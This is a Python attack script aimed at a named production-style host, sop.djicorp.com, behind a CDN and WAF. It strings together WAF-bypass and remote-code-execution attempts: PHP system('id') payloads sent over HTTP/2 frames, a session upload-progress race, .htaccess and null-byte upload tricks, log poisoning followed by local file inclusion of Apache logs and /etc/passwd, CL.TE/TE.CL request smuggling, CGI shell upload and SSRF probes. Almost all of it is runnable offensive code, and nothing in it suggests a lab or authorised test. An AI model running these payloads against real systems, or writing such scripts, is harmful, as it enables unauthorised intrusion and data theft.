#!/usr/bin/env python3
"""
Honeypot Bypass Script for https://sop.djicorp.com
Target: Tengine CDN + ibgsec WAF → Apache/2.4.38 (Debian) + PHP 7.2.34
"""

import requests
import socket
import ssl
import time
import threading
import queue
import urllib.parse
import struct
import io
import gzip
import zlib
import random
import string
import hashlib
from concurrent.futures import ThreadPoolExecutor

TARGET = "https://sop.djicorp.com"
UPLOAD_URL = f"{TARGET}/upload.php"
BASE_URL = TARGET

results = []

def log_result(method, status, summary, payload_preview=""):
    result = {
        "method": method,
        "status": status,
        "summary": summary[:200],
        "payload_preview": payload_preview[:200]
    }
    results.append(result)
    icon = "SUCCESS" if status == "SUCCESS" else "FAIL"
    print(f"[{icon}] {method}: {summary[:100]}")

def random_string(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# ============= HELPER: Direct raw socket over HTTPS =============
def raw_https_request(host, path, method="POST", headers=None, body=b"", timeout=15):
    """Send raw bytes over HTTPS, returns (status_line, headers, body)"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((host, 443), timeout=timeout)
    ssock = ctx.wrap_socket(sock, server_hostname=host)
    req = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"
    if headers:
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
    req += f"Content-Length: {len(body)}\r\n" if body else ""
    req += "\r\n"
    ssock.sendall(req.encode() + body)
    resp = b""
    while True:
        try:
            chunk = ssock.recv(4096)
            if not chunk:
                break
            resp += chunk
            if b"\r\n\r\n" in resp:
                header_end = resp.index(b"\r\n\r\n") + 4
                cl_pos = resp.find(b"Content-Length: ")
                if cl_pos != -1:
                    cl_end = resp.find(b"\r\n", cl_pos)
                    cl = int(resp[cl_pos+16:cl_end])
                    if len(resp) >= header_end + cl:
                        break
                else:
                    break
        except:
            break
    ssock.close()
    header_end = resp.index(b"\r\n\r\n") + 4
    status_line = resp.split(b"\r\n")[0].decode(errors='ignore')
    resp_body = resp[header_end:]
    return status_line, resp_body

# ============= HTTP/2 分帧绕过 =============
def try_http2_frame_bypass():
    """
    HTTP/2 framing: Wrap PHP payload in PRIORITY frame or use CONTINUATION to split
    HEADERS frame across multiple frames to bypass WAF.
    """
    print("\n=== [1] HTTP/2 分帧绕过 ===")
    try:
        import h2.connection
        import h2.events
        import h2.config
        import h2.settings

        host = "sop.djicorp.com"
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])
        sock = socket.create_connection((host, 443), timeout=10)
        ssock = ctx.wrap_socket(sock, server_hostname=host)
        negotiated = ssock.selected_alpn_protocol()
        if negotiated != "h2":
            log_result("HTTP/2 分帧", "FAIL", f"ALPN negotiated {negotiated}, not h2")
            return

        config = h2.config.H2Configuration(client_side=True, header_encoding='utf-8')
        conn = h2.connection.H2Connection(config=config)
        conn.initiate_connection()
        ssock.sendall(conn.data_to_send())

        # Test 1: PHP code in HEADERS pseudo-header (path)
        payloads = [
            {"path": "/upload.php", "body": "a=<?php system('id');?>&b=1"},
            {"path": "/upload.php?file=<?=phpinfo()?>", "body": "x=1"},
            {"path": "/uploads/test.php", "body": "<?php echo file_get_contents('/etc/passwd');?>"},
            {"path": "/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOw=="},
        ]

        for i, p in enumerate(payloads):
            stream_id = conn.get_next_available_stream_id()
            headers = [
                (":method", "POST" if p.get("body") else "GET"),
                (":path", p["path"]),
                (":authority", host),
                ("content-type", "application/x-www-form-urlencoded"),
            ]
            if p.get("body"):
                headers.append(("content-length", str(len(p["body"]))))
            conn.send_headers(stream_id, headers)
            # Send body in a separate DATA frame (potential WAF bypass)
            if p.get("body"):
                conn.send_data(stream_id, p["body"].encode(), end_stream=True)
            ssock.sendall(conn.data_to_send())
            time.sleep(0.5)
            resp_data = b""
            while True:
                try:
                    chunk = ssock.recv(65535)
                    if not chunk:
                        break
                    resp_data += chunk
                    events = conn.receive_data(chunk)
                    for event in events:
                        if isinstance(event, h2.events.ResponseReceived):
                            pass
                        elif isinstance(event, h2.events.DataReceived):
                            resp_data += event.data
                            conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                except:
                    break
            log_result(f"HTTP/2 分帧 payload#{i+1}", "INFO", f"Path: {p['path']}")

        conn.close_connection()
        ssock.sendall(conn.data_to_send())
        ssock.close()

    except ImportError:
        log_result("HTTP/2 分帧", "SKIP", "h2 module not installed (pip install h2)")
    except Exception as e:
        log_result("HTTP/2 分帧", "FAIL", str(e))

# ============= PHP Session Upload Progress =============
def try_php_session_race():
    """
    PHP session upload progress race condition.
    Requires session.upload_progress.enabled = On (check with phpinfo)
    """
    print("\n=== [2] PHP Session Upload Progress 竞争条件 ===")

    session_id = "PWN_" + random_string(16)

    # First verify session upload progress is visible
    try:
        r = requests.get(f"{TARGET}/index.php?file=/tmp/sess_{session_id}", verify=False, timeout=10)
        log_result("Session 检查", "INFO", f"Session file check status={r.status_code}, len={len(r.text)}")
    except Exception as e:
        log_result("Session 检查", "FAIL", str(e))

    def send_progress_upload():
        """Multipart upload with PHP_SESSION_UPLOAD_PROGRESS"""
        try:
            cookie = {"PHPSESSID": session_id}
            boundary = "----" + random_string(24)
            body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
                f'<?php system("id");?>\r\n'
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="progress.txt"\r\n'
                f'Content-Type: text/plain\r\n\r\n'
                f"test\r\n"
                f"--{boundary}--\r\n"
            )
            headers = {
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={session_id}",
            }
            requests.post(
                UPLOAD_URL, headers=headers, data=body,
                verify=False, timeout=10, cookies=cookie
            )
        except:
            pass

    def try_session_include():
        """Try to include the session file"""
        for path in [
            f"/index.php?file=/tmp/sess_{session_id}",
            f"/index.php?file=../../../tmp/sess_{session_id}",
            f"/index.php?file=/var/lib/php/sessions/sess_{session_id}",
            f"/index.php?file=/var/lib/php/session/sess_{session_id}",
            f"/index.php?file=/tmp/sess_{session_id}",
        ]:
            try:
                r = requests.get(f"{TARGET}{path}", verify=False, timeout=10)
                if r.status_code == 200 and ("uid=" in r.text or "www-data" in r.text):
                    log_result("Session 包含", "SUCCESS", f"RCE achieved via session ID: {session_id}", r.text[:200])
                    return True
            except:
                pass
        return False

    # Fire uploads and include attempts concurrently
    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = []
        for _ in range(30):
            futures.append(ex.submit(send_progress_upload))
        time.sleep(2)
        for _ in range(20):
            futures.append(ex.submit(try_session_include))
        for f in futures:
            f.result()

    log_result("Session Race", "DONE", "Race condition attempt completed")

# ============= .htaccess 注入 =============
def try_htaccess_payload():
    """Inject .htaccess via filename manipulation"""
    print("\n=== [3] .htaccess 绕过 ===")

    # Try different filename injections
    attempts = [
        (".htaccess", "AddType application/x-httpd-php .txt\n"),
        ("file.htaccess", ""),
        ("test.php\x00.txt", "<?php system('id');?>"),
        ("file.txt\r\nAddType application/x-httpd-php .txt\r\n", ""),
        ('file.txt"; filename=".htaccess', ""),  # MIME injection attempt
    ]

    for filename, content in attempts:
        try:
            clean_name = filename.replace("\r", "").replace("\n", "")
            files = {"file": (filename, content.encode() if content else b"test", "text/plain")}
            r = requests.post(UPLOAD_URL, files=files, verify=False, timeout=10)
            log_result(f".htaccess Injection ({repr(clean_name[:30])})", "INFO",
                       f"Status={r.status_code} {r.text[:80]}")
        except Exception as e:
            log_result(f".htaccess Injection", "FAIL", str(e))

# ============= Log Injection + PHP Filter =============
def try_log_injection():
    """Inject PHP into User-Agent, then LFI the log file"""
    print("\n=== [4] 日志/环境变量注入 ===")
    php_payload = "<?php system('id'); echo '---PWNED---'; ?>"

    # Inject via User-Agent
    try:
        headers = {
            "User-Agent": php_payload,
            "X-Forwarded-For": php_payload,
            "X-Client-IP": php_payload,
            "Referer": php_payload,
        }
        r = requests.get(TARGET, headers=headers, verify=False, timeout=10)
        log_result("Log Injection", "INFO", f"Sent payload, status={r.status_code}")

        # Try to include log files
        log_paths = [
            "/index.php?file=/var/log/apache2/access.log",
            "/index.php?file=/var/log/apache2/error.log",
            "/index.php?file=/var/log/apache2/access_log",
            "/index.php?file=/var/log/httpd/access_log",
            "/index.php?file=../../../var/log/apache2/access.log",
            "/index.php?file=/proc/self/environ",
            "/index.php?file=../../../proc/self/environ",
        ]
        for lp in log_paths:
            try:
                r2 = requests.get(f"{TARGET}{lp}", verify=False, timeout=10)
                if "---PWNED---" in r2.text or "uid=" in r2.text:
                    log_result("Log LFI", "SUCCESS", f"RCE via {lp}", r2.text[:200])
                    return
            except:
                pass
    except Exception as e:
        log_result("Log Injection", "FAIL", str(e))

    # Try php://filter chains (iconv)
    filter_chains = [
        "/index.php?file=php://filter/convert.base64-encode/resource=/etc/passwd",
        "/index.php?file=php://filter/read=convert.iconv.utf-8.utf-7/resource=index.php",
        "/index.php?file=php://filter/convert.base64-encode/resource=upload.php",
    ]
    for fc in filter_chains:
        try:
            r = requests.get(f"{TARGET}{fc}", verify=False, timeout=10)
            if r.status_code == 200 and len(r.text) > 50:
                log_result("PHP Filter", "SUCCESS" if "root:" in r.text else "INFO",
                           f"Filter chain: {fc}", r.text[:100])
        except:
            pass

# ============= HTTP Request Smuggling =============
def try_http_smuggling():
    """CL.TE and TE.CL smuggling"""
    print("\n=== [5] HTTP Request Smuggling ===")
    host = "sop.djicorp.com"
    php_payload = "<?php system('id');?>"

    # CL.TE: Frontend uses Content-Length, backend uses Transfer-Encoding
    smuggled_body = f"POST /upload.php HTTP/1.1\r\nHost: {host}\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ncmd={php_payload}"
    cl_te_body = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(smuggled_body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
    ) + smuggled_body

    try:
        status, resp = raw_https_request(host, "/", "POST",
            {"Content-Length": str(len(cl_te_body)), "Transfer-Encoding": "chunked"},
            cl_te_body.encode())
        log_result("CL.TE Smuggling", "INFO", f"Status: {status}, resp_len={len(resp)}")
    except Exception as e:
        log_result("CL.TE Smuggling", "FAIL", str(e))

    # TE.CL
    te_cl_body = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST /upload.php HTTP/1.1\r\nHost: " + host.encode() + b"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\ncmd=<?php system('id');?>\r\n0\r\n\r\n"
    try:
        status, resp = raw_https_request(host, "/", "GET",
            {"Transfer-Encoding": "chunked", "Content-Length": "4"},
            b"5c\r\nGPOST /upload.php HTTP/1.1\r\nHost: " + host.encode() + b"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\ncmd=<?php system('id');?>\r\n0\r\n\r\n")
        log_result("TE.CL Smuggling", "INFO", f"Status: {status}, resp_len={len(resp)}")
    except Exception as e:
        log_result("TE.CL Smuggling", "FAIL", str(e))

# ============= Apache CGI =============
def try_cgi_exploit():
    """Check mod_cgi/mod_cgid and .cgi upload"""
    print("\n=== [6] Apache mod_cgi 检查 ===")
    for path in ["/cgi-bin/", "/cgi-bin/test.cgi", "/cgi-bin/php"]:
        try:
            r = requests.get(f"{TARGET}{path}", verify=False, timeout=10)
            log_result(f"CGI Check ({path})", "INFO", f"Status={r.status_code}, len={len(r.text)}")
        except:
            pass

    # Try uploading CGI script
    cgi_body = "#!/usr/bin/php\n<?php system('id');?>"
    try:
        files = {"file": ("shell.cgi", cgi_body, "text/plain")}
        r = requests.post(UPLOAD_URL, files=files, verify=False, timeout=10)
        log_result("CGI Upload", "INFO", f"Status={r.status_code}")
    except Exception as e:
        log_result("CGI Upload", "FAIL", str(e))

# ============= PHP 7.2 CVEs =============
def try_php_cves():
    """CVE-2019-11043, CVE-2018-5711, etc."""
    print("\n=== [7] PHP 7.2 CVE 尝试 ===")

    # CVE-2019-11043 (PHP-FPM RCE) - likely not applicable if mod_php
    try:
        # Send specially crafted query strings
        for qs in [
            "?a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6&a[]=7&a[]=8&a[]=9",
            "?PHP_VALUE=allow_url_include%3dOn%0d%0adisable_functions%3d%0d%0a",
            "?PHPRC=/dev/fd/0",
        ]:
            r = requests.get(f"{TARGET}/index.php{qs}", verify=False, timeout=10)
            log_result(f"CVE-2019-11043-like ({qs[:40]})", "INFO", f"Status={r.status_code}")
    except Exception as e:
        log_result("PHP CVE probes", "FAIL", str(e))

    # php://filter with convert.iconv.* RCE chain
    iconv_chain = "php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=php://temp"
    try:
        r = requests.get(f"{TARGET}/index.php?file={iconv_chain}", verify=False, timeout=10)
        log_result("iconv chain", "INFO", f"Status={r.status_code}, len={len(r.text)}")
    except Exception as e:
        log_result("iconv chain", "FAIL", str(e))

# ============= SSRF =============
def try_ssrf():
    """Server-Side Request Forgery via allow_url_fopen"""
    print("\n=== [8] SSRF 探测 ===")
    callback_url = "http://sop.djicorp.com/"

    # Try SSRF via various parameter injections
    ssrf_params = [
        {"url": callback_url, "file": callback_url},
        {"page": f"http://127.0.0.1:80/"},
        {"include": f"http://127.0.0.1/"},
    ]

    for params in ssrf_params:
        for param_name, param_value in params.items():
            try:
                r = requests.get(TARGET, params={param_name: param_value}, verify=False, timeout=10)
                log_result(f"SSRF ({param_name}={param_value[:40]})", "INFO", f"Status={r.status_code}, len={len(r.text)}")
            except:
                pass

    # Try uploading a file that contains PHP + URL to trigger SSRF
    try:
        files = {"file": ("test.txt", f"<?php echo file_get_contents('http://127.0.0.1/');?>", "text/plain")}
        r = requests.post(UPLOAD_URL, files=files, verify=False, timeout=10)
        log_result("SSRF via upload", "INFO", f"Status={r.status_code}")
    except:
        pass

# ============= Main =============
def main():
    print("=" * 60)
    print(f"Target: {TARGET}")
    print(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)

    try_http2_frame_bypass()
    try_php_session_race()
    try_htaccess_payload()
    try_log_injection()
    try_http_smuggling()
    try_cgi_exploit()
    try_php_cves()
    try_ssrf()

    print("\n" + "=" * 60)
    print("SUMMARY:")
    print("=" * 60)
    successes = [r for r in results if r["status"] == "SUCCESS"]
    fails = [r for r in results if r["status"] in ("FAIL", "SKIP")]
    infos = [r for r in results if r["status"] == "INFO"]

    if successes:
        print(f"\nSUCCESSFUL ({len(successes)}):")
        for r in successes:
            print(f"  - {r['method']}: {r['summary']}")
            if r['payload_preview']:
                print(f"    Payload: {r['payload_preview']}")

    print(f"\nTotal: {len(results)} checks ({len(successes)} success, {len(infos)} info, {len(fails)} fail/skip)")

    # Summary for report
    print("\n" + "=" * 60)
    print("DETAILED RESULTS:")
    print("=" * 60)
    for r in results:
        print(f"[{r['status']:7s}] {r['method']}")
        print(f"       ├─ Summary: {r['summary'][:100]}")
        if r['payload_preview']:
            print(f"       └─ Payload: {r['payload_preview'][:100]}")
        print()

if __name__ == "__main__":
    main()